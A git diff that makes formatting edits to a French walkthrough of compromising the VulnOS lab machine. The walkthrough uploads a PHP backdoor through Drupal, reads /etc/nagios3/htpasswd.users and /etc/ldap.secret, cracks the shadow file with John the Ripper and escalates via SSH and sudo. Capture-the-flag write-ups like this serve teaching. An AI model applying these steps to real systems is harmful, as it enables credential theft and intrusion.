@@ -289,13 +289,13 @@ J'édite un des posts existant pour ajouter ma backdoor PHP en attachement mais 
 
 Dans *Administer > Site configuration > Files uploads* j'ai pu ajouter le type phtml puis finalement uploader la backdoor (drupal l'a placée dans */drupal6/sites/default/files/*).  
 
-Netcat est installé sur le système mais ne dispose pas de l'option -e pour y attacher un shell.  
+Netcat est installé sur le système, mais ne dispose pas de l'option -e pour y attacher un shell.  
 
 Sur le blog Pentest du SANS j'ai trouvé [un article qui permet de résoudre ce problème via l'utilisation de mknod](http://pen-testing.sans.org/blog/pen-testing/2013/05/06/netcat-without-e-no-problem).  
 
-Un upload de tshd plus tard...  
+Un upload de `tshd` plus tard...  
 
-```bash
+```console
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ uname -a
@@ -306,7 +306,7 @@ C'est bien joli, mais ça ne nous donne pas un accès root. Le kernel 2.6.32 sem
 
 J'ai donc continué à fouiller dans les fichiers via la faille webmin ou mon accès shell. Finalement j'ai repéré un pattern dans les mots de passe d'abord avec le password Nagios que j'ai pu casser :  
 
-```bash
+```console
 $ cat /etc/nagios3/htpasswd.users
 nagiosadmin:8A86JOBWoCwnk
 
@@ -320,7 +320,7 @@ Puis via le contenu du fichier */etc/ldap.secret* : canuhackme
 
 J'ai créé une wordlist en me basant sur les noms d'utilisateurs récupérés + les mots de passe + des versions préfixées de canu et j'ai lancé JtR sur le fichier shadow :  
 
-```bash
+```console
 $ /opt/jtr/john --wordlist=passwords.txt --rules shadow
 Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
 Use the "--format=crypt" option to force loading these as that type instead
@@ -331,7 +331,7 @@ guesses: 1  time: 0:00:00:00 DONE (Thu May 29 09:13:23 2014)  c/s: 175  trying: 
 
 On peut se connecter à SSH via cet account puis passer root via sudo car il est privilégié :  
 
-```bash
+```console
 $ ssh vulnosadmin@192.168.1.29
 vulnosadmin@192.168.1.29's password: 
 Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux
